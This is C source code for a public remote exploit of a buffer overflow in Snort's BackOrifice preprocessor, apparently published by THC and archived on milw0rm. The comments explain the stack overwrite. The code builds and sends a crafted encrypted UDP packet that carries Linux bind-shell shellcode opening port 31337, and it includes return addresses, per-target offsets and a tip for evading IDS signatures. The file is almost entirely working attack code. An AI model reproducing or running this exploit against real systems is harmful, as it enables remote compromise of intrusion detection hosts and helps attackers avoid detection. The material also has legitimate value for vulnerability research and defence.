/*
 * THCsnortbo 0.3 - Snort BackOrifice PING exploit
 * by rd@thc.org
 * THC PUBLIC SOURCE MATERIALS
 * 
 * Bug was found by Internet Security Systems 
 * http://xforce.iss.net/xforce/alerts/id/207
 *
 * v0.3	- removed/cleaned up info for public release
 * v0.2 - details added, minor changes
 * v0.1 - first release
 * 
 * Greetz to all guests at THC's 10th 
 * Anniversary (TAX) :>
 * 
 * $Id: THCsnortbo.c,v 1.1 2005/10/24 11:38:59 thccvs Exp $
 *
 */

/* 
 * DETAILS
 *
 * The bug is in spp_bo.c, BoGetDirection() function
 * static int BoGetDirection(Packet *p, char *pkt_data) {
 *   u_int32_t len = 0;
 *   u_int32_t id = 0;
 *   u_int32_t l, i;
 *   char type;
 *   char buf1[1024];
 *   
 *   ...
 *   buf_ptr = buf1;
 *   ...
 *   while ( i < len ) {
 *      plaintext = (char) (*pkt_data ^ (BoRand()%256));
 *      *buf_ptr = plaintext;
 *      i++;
 *      pkt_data++;
 *      buf_ptr++;
 *
 * len is taken from the BO packet header, so its a buffer 
 * overflow when len > buf1 size.
 * 
 * The exchange of data between the BO client and server is 
 * done using encrypted UDP packets
 * 
 * BO Packet Format (Ref: http://www.magnux.org/~flaviovs/boproto.html)
 * Mnemonic 	Size in bytes
 * MAGIC 	8
 * LEN		4
 * ID		4
 * T		1
 * DATA 	variable
 * CRC 		1
 *
 * On x86, because of the stack layout, we end up overwriting 
 * the loop counter (i and len). To solve this problem, we 
 * can set back the approriate value for i and len. We can 
 * also able to set a NULL byte to stop the loop. 
 *
 * There is no chance for bruteforce, snort will die after the 
 * first bad try. On Linux system with kernel 2.6 with VA 
 * randomized, it would be much harder for a reliable exploit.
 *
 * 
 * In case of _non-optimized_ compiled snort binary, the stack 
 * would looks like this:
 *
 * [ buf1 ]..[ i ]..[ len ]..[ebp][eip][*p][*pkt_data]
 * 
 * The exploit could be reliable in this case, by using a 
 * pop/ret return addess. Lets send to snort a UDP packet 
 * as the following:
 *
 * [ BO HEADERS ][ .. ][ i ][ .. ][ len ][ .. ][ ret addr ][ NOP ][ shellcode ]
 * [                     Encrypted                        ][   Non Encrypted  ]
 *
 * When the overwriting loop stop, pkt_data will point to 
 * the memory after return address (NOP part) in raw packet 
 * data. So, using a return address that points to POP/RET 
 * instructions would be enough for a reliable exploit.
 * (objdump -d binary|grep -B1 ret|grep -A1 pop to find one)
 * 
 * This method will work well under linux kernel 2.6 with VA 
 * randomized also.
 * 
 * In case of optimized binary, it would be harder since
 * the counter i, len and buffer pointers could/possibly be 
 * registered variables. And the register points to buffer 
 * get poped from stack when the funtion return. In this case, 
 * the return address should be hard-coded but it would be 
 * unreliable (especially on linux kernel 2.6 with VA 
 * randomization patch).
 *
 * This exploit would generally work. Providing that you know
 * how to find and use correct offsets and return address :>
 *
 *  
 * Example:
 * 
 * $ ./THCsnortbo
 * Snort BackOrifice PING exploit (version 0.3)
 * by rd@thc.org
 *
 * Usage: ./THCsnortbo host target
 *
 * Available Targets:
 *   1 | manual testing gcc with -O0
 *   2 | manual testing gcc with -O2
 *     
 * $ ./snortbo 192.168.0.101 1
 * Snort BackOrifice PING exploit (version 0.3)
 * by rd@thc.org
 *
 * Selected target:
 *   1 | manual testing gcc with -O0
 *   
 * Sending exploit to 192.168.0.101
 * Done.
 *
 * $ nc 192.168.0.101 31337
 * id
 * uid=104(snort) gid=409(snort) groups=409(snort)
 * uname -sr
 * Linux 2.6.11-hardened-r1
 * 
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif
#ifdef HAVE_SYS_TIME_H
#include <sys/time.h>
#endif
#ifdef HAVE_SYS_SELECT_H
#include<sys/select.h>
#endif
#ifdef HAVE_STRINGS_H
#include<strings.h>
#endif
#ifdef HAVE_MALLOC_H
#include <malloc.h>
#endif
#include <netdb.h>
#include <string.h>
#include <ctype.h>

#define VERSION "0.3"

/* shellcodes */
 
/* a quick test bind shellcode on port 31337 from metasploit
 * 
 * Connect back shellcode for snort exploit should be better, do 
 * it by yourself. im lazy :>
 */
unsigned char x86_lnx_bind[] =
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
"\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\x89\xe1\xcd\x80";

typedef struct {
	char 		*desc;		// description
	unsigned char	*scode;		// shellcode
	unsigned int	scode_len;	
	unsigned long	retaddr;	// return address
	unsigned int	i_var_off;	// offset from buf1 to variable 'i'
	unsigned int	len_var_off;	// offset from buf1 to variable 'len'
	unsigned int    ret_off;	// offset from buf1 to saved eip
	unsigned int	datasize; 	// value of size field in BO ping packet
} t_target;

t_target targets[] = {
	{
	"manual testing gcc with -O0",
	x86_lnx_bind, sizeof(x86_lnx_bind),
	//0x0804aa07, 
	0x4008f000+0x16143,	// pop/ret in libc
	1024+1+32, 1024+1+44, 1024+1+60,
	0xFFFFFFFF
	},
	{
	"manual testing gcc with -O2",
	x86_lnx_bind, sizeof(x86_lnx_bind),
	0x0804aa07, //0xbfffe9e0 
	1024+1+8, 1024+1+20, 1024+1+44,
	1048+4+24
	},
	{ NULL, NULL, 0, 0, 0, 0, 0, 0 }
};

#define PACKETSIZE 1400	
#define OVERFLOW_BUFFSZ 1024
#define IVAL 0x11223344;
#define LVAL 0x11223354+16;

#define ARGSIZE 256
#define PORT 53
#define MAGICSTRING "*!*QWTY?"
#define MAGICSTRINGLEN 8
#define TYPE_PING 0x01

static long holdrand = 1L;
char g_password[ARGSIZE];
int port = PORT;

/* 
 * borrowed some code from BO client
 */
void  msrand (unsigned int seed )
{
	holdrand = (long)seed;
}

int mrand ( void)
{ 
	return(((holdrand = holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

unsigned int getkey()
{
	int x, y;
	unsigned int z;

	y = strlen(g_password);
	if (!y)
		return 31337;
	else {
		z = 0;
		for (x = 0; x < y; x++)
		z+= g_password[x];
    
		for (x = 0; x < y; x++) {
			if (x%2)
				z-= g_password[x] * (y-x+1);
			else
				z+= g_password[x] * (y-x+1);
			z = z%RAND_MAX;
      		}
		
		z = (z * y)%RAND_MAX;
    		return z;
  	}
}

void BOcrypt(unsigned char *buff, int len)
{
	int y;
  
	if (!len)
		return;
  
	msrand(getkey());
	for (y = 0; y < len; y++)
		buff[y] = buff[y] ^ (mrand()%256);
}

void explbuild(unsigned char *buff, t_target *t)
{
	unsigned char *ptr;
	unsigned long *pdw;
	unsigned long size;
	unsigned char   *scode;	
        unsigned int    scode_len;
        unsigned long   retaddr;
	unsigned int    i_var_off;
	unsigned int    len_var_off;
	unsigned int    ret_off;
	unsigned int    datasize;

	scode = t->scode;
	scode_len = t->scode_len;
	retaddr = t->retaddr;
	i_var_off = t->i_var_off;
	len_var_off = t->len_var_off;
	ret_off = t->ret_off;
	datasize = t->datasize;

	memset(buff, 0x90, PACKETSIZE); 
	buff[PACKETSIZE - 1] = 0;
	
	strcpy(buff, MAGICSTRING);
 
	pdw = (unsigned long *)(buff + MAGICSTRINGLEN);
    	*pdw++ = datasize;
      	*pdw++ = (unsigned long)-1;
         ptr = (unsigned char *)pdw;
	*ptr++ = TYPE_PING;

	size = IVAL;
	memcpy(buff + i_var_off, &size, 4);
	size = LVAL;
	memcpy(buff + len_var_off, &size, 4); 

	memcpy(buff + ret_off, &retaddr, 4);

	/* you may want to place shellcode on encrypted part and will
	 * be decrypted into buf1 by BoGetDirection
	 */
	// memcpy(buff + OVERFLOW_BUFFSZ - scode_len - 128, 
	//		(char *) scode, scode_len);

	memcpy(buff + PACKETSIZE - scode_len - 1, (char *)scode, scode_len);

	/* you may want to set NULL byte to stop the loop here, but it 
	 * won't work with pop/ret method
	 */
	// buff[ret_off + 4] = 0;

  	size = ret_off + 4;
  	BOcrypt(buff, (int)size);
}

int sendping(unsigned long dest, int port, int sock, unsigned char *buff)
{
	struct sockaddr_in host;
	int i, size;
	fd_set fdset;
	struct timeval tv;
	
	size=PACKETSIZE;
	host.sin_family = AF_INET;
	host.sin_port = htons((u_short)port);
	host.sin_addr.s_addr = dest;
  
	FD_ZERO(&fdset);
	FD_SET(sock, &fdset);
	tv.tv_sec = 10;
	tv.tv_usec = 0;

	i = select(sock+1, NULL, &fdset, NULL, &tv);
	if (i == 0) {
		printf("Timeout\n");
		return(1);
	} else if (i < 0) {
		perror("select: ");
		return(1);
	}

	if ( (sendto(sock, buff, size, 0, 
		(struct sockaddr *)&host, sizeof(host))) != size ) {
		perror("sendto: ");
		return(1);
	}

	return 0;
}

void usage(char *prog) 
{
	int n;
	  
	printf("Usage: %s host target\n\nAvailable Targets:\n", prog);
	
	for (n = 0 ; targets[n].desc != NULL ; n++) 
  		printf ("%3d | %s\n", n + 1, targets[n].desc);
	printf ("    \n");
}


int main(int argc, char **argv)
{
	struct in_addr hostin;
	unsigned long dest;
	char buff[PACKETSIZE];
	int ntarget;
   
	printf("Snort BackOrifice PING exploit (version "VERSION")\n"
		"by rd@thc.org\n\n");

	if (argc < 3 || ((ntarget = atoi(argv[2])) <= 0) ) {
		usage(argv[0]);
		return 0;
	}

	if (ntarget >= (sizeof(targets) / sizeof(t_target))) {
		printf ("WARNING: target out of list. list:\n\n");
		usage(argv[0]);
		return 0;
	}					

	ntarget = ntarget - 1;

	// change the key here to avoid the detection of a simple 
	// packet matching IDS signature.
	g_password[0] = 0;

	if ( (dest = inet_addr(argv[1])) == (unsigned long)-1)
		printf("Bad IP: '%s'\n", argv[1]);
	else {
		int s;
		hostin.s_addr = dest;
		s=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);

		printf("Selected target:\n%3d | %s\n", ntarget+1, 
				targets[ntarget].desc);
		explbuild(buff, &targets[ntarget]);

		printf("\nSending exploit to %s\n", inet_ntoa(hostin));
		if (sendping(dest, port, s, buff))
			printf("Sending exploit failed for dest %s\n", 
					inet_ntoa(hostin));
		printf("Done.\n");
	}

	return 0;
}

// milw0rm.com [2005-10-25]
